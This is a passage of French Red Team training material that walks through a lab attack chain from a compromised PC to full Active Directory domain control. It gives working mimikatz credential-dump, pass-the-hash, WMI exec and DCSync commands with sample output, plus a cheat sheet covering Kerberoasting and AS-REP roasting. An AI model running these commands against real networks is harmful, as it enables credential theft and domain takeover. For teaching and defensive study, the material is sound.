Ce TP synthétise l'ensemble des techniques vues dans ce module. L'objectif est de partir d'un **poste compromis** avec accès administrateur local pour atteindre le **contrôle complet du domaine**.

#### Topologie

```
    Internet
       |
       | (Phishing → accès initial)
       ▼
┌────────────────┐
│  CORP-PC01     │  ← Machine cible initiale (admin local acquis)
│  10.0.1.15     │
└────────┬───────┘
         |
         |  Réseau interne (10.0.1.0/24)
         |
┌────────────────┐     ┌────────────────┐     ┌────────────────┐
│  FILESERVER    │     │  SRV01 (SQL)    │     │  DC01          │
│  10.0.1.50     │     │  10.0.1.30      │     │  10.0.1.10     │
│  Partages SMB  │     │  SQL Server     │     │  Contrôleur    │
└────────────────┘     └────────────────┘     │  de domaine    │
                                               └────────────────┘
```

#### Objectifs

| Étape | Action | Technique | Résultat attendu |
|---|---|---|---|
| 1 | Credential Dump sur PC01 | T1003.001 | Hash NTLM de l'admin local |
| 2 | Pass-the-Hash vers FILESERVER | T1550.002 | Shell sur FILESERVER |
| 3 | Credential Dump sur FILESERVER | T1003.001 | Hash NTLM d'un admin domaine |
| 4 | WMI exec sur SRV01 | T1021.003 | Shell sur SRV01 |
| 5 | DCSync sur DC01 | T1003.006 | Tous les hashs du domaine |
| 6 | Domain Admin | T1078.002 | Contrôle complet du domaine |

### 10.2 Déroulé détaillé

#### Étape 1 : Credential Dump sur PC01

```powershell
# Étape 1A : Transfert des outils
$client = New-Object System.Net.WebClient
$client.DownloadFile('http://10.0.0.10:8000/mimikatz.exe', 'C:\Windows\Temp\mimikatz.exe')

# Étape 1B : Extraction des credentials
cd C:\Windows\Temp
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit"
```

**Résultat :**
```
jdupont:CORP:31d6cfe0d16ae931b73c59d7e0c089c0
Administrateur (local):8846f7eaee8fb117ad06bdd830b7586c
```

#### Étape 2 : Pass-the-Hash vers FILESERVER

```bash
# Vérifier la portée du hash admin local
crackmapexec smb 10.0.1.15-60 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c

# Résultat : l'admin local de PC01 est aussi admin sur FILESERVER

# Shell sur FILESERVER
impacket-psexec -hashes :8846f7eaee8fb117ad06bdd830b7586c corp.local/Administrator@10.0.1.50

# Depuis le shell :
whoami
# nt authority\system
hostname
# FILESERVER
```

#### Étape 3 : Credential Dump sur FILESERVER

```mimikatz
# Sur FILESERVER, exécuter Mimikatz
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

**Résultat :** Un administrateur de domaine est connecté à FILESERVER.
```
User: CORP\Administrator (admin domaine)
Hash NTLM: 9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d
```

#### Étape 4 : WMI exec vers SRV01

```bash
impacket-wmiexec -hashes :9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d corp.local/Administrator@10.0.1.30

whoami
# corp\administrator
hostname
# SRV01
```

#### Étape 5 : DCSync vers DC01

```bash
impacket-secretsdump -just-dc -hashes :9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d corp.local/Administrator@10.0.1.10 > domain_hashes.txt

grep -E 'krbtgt|Administrator|500:|502:' domain_hashes.txt
```

**Résultat :**
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e:::
```

#### Étape 6 : Vérification Domain Admin

```bash
crackmapexec smb 10.0.1.10 -u Administrator -H 9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d
# [+] corp.local\Administrator (Pwn3d!)
```

### 10.3 Tableau ATT&CK complet

| Phase | Tactic | Technique | Sub-technique | Code | Outil |
|---|---|---|---|---|---|
| 1 | Credential Access | OS Credential Dumping | LSASS Memory | T1003.001 | Mimikatz |
| 2 | Lateral Movement | Use Alternate Authentication Material | Pass-the-Hash | T1550.002 | impacket-psexec |
| 3 | Credential Access | OS Credential Dumping | LSASS Memory | T1003.001 | Mimikatz |
| 4 | Lateral Movement | Remote Services | Windows Management Instrumentation | T1021.003 | impacket-wmiexec |
| 5 | Credential Access | OS Credential Dumping | DCSync | T1003.006 | secretsdump.py |
| 6 | Persistence | Valid Accounts | Domain Accounts | T1078.002 | CrackMapExec |

### 10.4 Heat Map

**Fichier JSON pour ATT&CK Navigator :**

```json
{
    "name": "SCAD — Lateral Movement & Elevation",
    "version": "4.1",
    "domain": "mitre-enterprise",
    "description": "Heat map du TP synthèse Module 8 — SDV 2026",
    "techniques": [
        {
            "techniqueID": "T1003",
            "sub-techniques": [
                {
                    "techniqueID": "T1003.001",
                    "color": "#d62728",
                    "score": 95,
                    "comment": "Credential Dump LSASS sur PC01 et FILESERVER"
                },
                {
                    "techniqueID": "T1003.006",
                    "color": "#d62728",
                    "score": 100,
                    "comment": "DCSync sur DC01 — réplication des hashs du domaine"
                }
            ],
            "color": "#d62728",
            "score": 100,
            "comment": "Credential Access — clé de toute l'attaque"
        },
        {
            "techniqueID": "T1550",
            "sub-techniques": [
                {
                    "techniqueID": "T1550.002",
                    "color": "#d62728",
                    "score": 90,
                    "comment": "Pass-the-Hash de PC01 vers FILESERVER"
                }
            ],
            "color": "#d62728",
            "score": 90,
            "comment": "Alternate Authentication Material"
        },
        {
            "techniqueID": "T1021",
            "sub-techniques": [
                {
                    "techniqueID": "T1021.003",
                    "color": "#f5b042",
                    "score": 80,
                    "comment": "WMI exec de FILESERVER vers SRV01"
                }
            ],
            "color": "#f5b042",
            "score": 80,
            "comment": "Remote Services"
        },
        {
            "techniqueID": "T1078",
            "sub-techniques": [
                {
                    "techniqueID": "T1078.002",
                    "color": "#f5b042",
                    "score": 85,
                    "comment": "Vol de compte admin domaine"
                }
            ],
            "color": "#f5b042",
            "score": 85,
            "comment": "Valid Accounts"
        }
    ],
    "gradient": {
        "colors": ["#98df8a", "#f5b042", "#d62728"],
        "minValue": 0,
        "maxValue": 100
    },
    "legendItems": [
        {"label": "Non utilisé", "color": "#ececec"},
        {"label": "Utilisé", "color": "#f5b042"},
        {"label": "Réussi (critique)", "color": "#d62728"}
    ],
    "filters": {
        "stages": ["act"],
        "platforms": ["windows"]
    },
    "sorting": 0,
    "viewMode": 0,
    "hideDisabled": false
}
```

### 10.5 Questions de synthèse

1. **Quel est le point de départ de toute attaque de lateral movement ?**
   - Le credential dumping. Sans identifiants, aucun mouvement latéral n'est possible.

2. **Pourquoi le Pass-the-Hash fonctionne-t-il même si on ne connaît pas le mot de passe ?**
   - Car le protocole NTLM utilise le hash du mot de passe comme secret partagé, pas le mot de passe lui-même.

3. **Quelle est la différence entre PtH, PtT et Overpass-the-Hash ?**
   - **PtH** : utilise directement le hash NTLM pour l'auth NTLM
   - **PtT** : injecte un ticket Kerberos déjà obtenu
   - **Overpass-the-Hash** : convertit un hash NTLM en TGT Kerberos

4. **Quel est l'avantage de l'Overpass-the-Hash sur le PtH simple ?**
   - Contourner la limitation WinRM (qui n'accepte pas le PtH direct)
   - Permet l'authentification Kerberos (plus furtive)

5. **Quels droits sont nécessaires pour un DCSync ?**
   - `Replicating Directory Changes` et `Replicating Directory Changes All` sur le contexte de nommage du domaine.

6. **Comment détecter un Kerberoasting ?**
   - EventID 4769 (TGS demandé) pour des comptes de service, surtout en grand nombre et depuis une source inhabituelle.

7. **Quelle est la défense la plus efficace contre l'AS-REP Roasting ?**
   - Activer la pré-authentification Kerberos sur tous les comptes (valeur par défaut).

---

## 11. Annexes

### 11.1 Tableau récapitulatif des outils

| Outil | Type | Technique | Usage |
|---|---|---|---|
| **Mimikatz** | Binaire Windows | T1003, T1550.003 | Dump credentials, manipulation tickets |
| **Rubeus** | Binaire Windows (.NET) | T1550.003, T1558.003, T1558.004 | Kerberos abuse |
| **LaZagne** | Binaire Windows | T1003 | Extraction mots de passe stockés |
| **ProcDump** | Binaire Windows | T1003 (auxiliaire) | Dump LSASS pour analyse offline |
| **pypykatz** | Python | T1003 | Extraction credentials depuis dump (offline) |
| **CrackMapExec** | Python | T1550.002, T1021 | Automatisation post-exploitation |
| **impacket-psexec** | Python | T1021 | Exécution distante via SMB |
| **impacket-wmiexec** | Python | T1021.003 | Exécution distante via WMI |
| **impacket-smbexec** | Python | T1021 | Exécution via services/tâches |
| **evil-winrm** | Ruby | T1021 | Connexion WinRM |
| **secretsdump.py** (impacket) | Python | T1003.006 | DCSync |
| **impacket-GetUserSPNs** | Python | T1558.003 | Kerberoasting |
| **impacket-GetNPUsers** | Python | T1558.004 | AS-REP Roasting |
| **hashcat** | Binaire | T1558.003, T1558.004 | Cracking de hashs |
| **John the Ripper** | Binaire | T1558.003, T1558.004 | Cracking de hashs |

### 11.2 Commandes essentielles

```bash
# === CREDENTIAL DUMP ===
# Mimikatz — logonpasswords
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Mimikatz — SAM
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"

# Mimikatz — clés Kerberos
mimikatz.exe "privilege::debug" "sekurlsa::ekeys" "exit"

# ProcDump + pypykatz (offline)
procdump.exe -ma -accepteula lsass.exe lsass.dmp
pypykatz lsa minidump lsass.dmp

# === PASS-THE-HASH ===
crackmapexec smb TARGET -u USER -H HASH
impacket-psexec -hashes :HASH DOMAIN/USER@TARGET
impacket-wmiexec -hashes :HASH DOMAIN/USER@TARGET

# === OVERPASS-THE-HASH ===
impacket-getTGT DOMAIN/USER -hashes :HASH
export KRB5CCNAME=/path/to/USER.ccache
evil-winrm -i TARGET.DOMAIN -u USER -k

# === PASS-THE-TICKET ===
mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"
mimikatz.exe "privilege::debug" "kerberos::ptt ticket.kirbi" "exit"

# === DCSync ===
impacket-secretsdump -just-dc -hashes :HASH DOMAIN/ADMIN@DC
mimikatz.exe "lsadump::dcsync /domain:DOMAIN /user:ADMIN" "exit"

# === KERBEROASTING ===
impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip IP -request -format hashcat
hashcat -m 13100 tgs_hashes.txt rockyou.txt -o cracked.txt

# === AS-REP ROASTING ===
impacket-GetNPUsers DOMAIN/ -dc-ip IP -no-pass -usersfile users.txt -format hashcat
hashcat -m 18200 asrep_hashes.txt rockyou.txt -o cracked.txt
```

### 11.3 Glossaire

| Terme | Définition |
|---|---|
| **NTLM** | New Technology LAN Manager — protocole d'authentification challenge-response |
| **Hash NTLM** | Hash du mot de passe stocké dans le SAM ou AD (format MD4) |
| **LSASS** | Local Security Authority Subsystem Service — processus gérant l'authentification |
| **SAM** | Security Account Manager — base de données des comptes locaux |
| **NTDS.dit** | Active Directory database — fichier contenant tous les objets du domaine |
| **KDC** | Key Distribution Center — service Kerberos sur le contrôleur de domaine |
| **TGT** | Ticket Granting Ticket — ticket d'authentification Kerberos initial |
| **TGS** | Ticket Granting Service — ticket pour un service spécifique |
| **SPN** | Service Principal Name — identifiant unique d'un service dans Kerberos |
| **DCSync** | Technique de réplication MS-DRSR pour extraire les hashs du domaine |
| **MS-DRSR** | Microsoft Directory Replication Service — protocole de réplication AD |
| **PtH** | Pass-the-Hash — authentification par hash NTLM sans mot de passe |
| **PtT** | Pass-the-Ticket — injection de ticket Kerberos |
| **Overpass-the-Hash** | Conversion hash NTLM en TGT Kerberos |
| **Kerberoasting** | Demande de TGS pour cracker le mot de passe d'un compte de service |
| **AS-REP Roasting** | Demande d'AS-REP pour les comptes sans pré-authentification |
| **SCAD** | Séquence Complète d'Attaque Dirigée |

### 11.4 Références

| Ressource | URL |
|---|---|
| MITRE ATT&CK — TA0008 (Lateral Movement) | https://attack.mitre.org/tactics/TA0008/ |
| MITRE ATT&CK — T1003 (OS Credential Dumping) | https://attack.mitre.org/techniques/T1003/ |
| MITRE ATT&CK — T1550 (Use Alternate Authentication Material) | https://attack.mitre.org/techniques/T1550/ |
| MITRE ATT&CK — T1558 (Steal or Forge Kerberos Tickets) | https://attack.mitre.org/techniques/T1558/ |
| Mimikatz (Benjamin Delpy) | https://github.com/gentilkiwi/mimikatz |
| Rubeus (Harmj0y) | https://github.com/GhostPack/Rubeus |
| Impacket (SecureAuth) | https://github.com/fortra/impacket |
| LaZagne (AlessandroZ) | https://github.com/AlessandroZ/LaZagne |
| CrackMapExec (byt3bl33d3r) | https://github.com/byt3bl33d3r/CrackMapExec |
| evil-winrm (Hackplayers) | https://github.com/Hackplayers/evil-winrm |
| Hashcat | https://hashcat.net/hashcat/ |
| ProcDump (SysInternals) | https://docs.microsoft.com/sysinternals/downloads/procdump |
| pypykatz (SkelSec) | https://github.com/skelsec/pypykatz |
| Atomic Red Team (T1003 tests) | https://github.com/redcanaryco/atomic-red-team |
| NIS2 Directive (EUR-Lex) | https://eur-lex.europa.eu/eli/dir/2022/2555 |

---

*Document rédigé pour la formation Red Team — Master 2 Sécurité et Défense des Systèmes d'Information — SDV 2026*
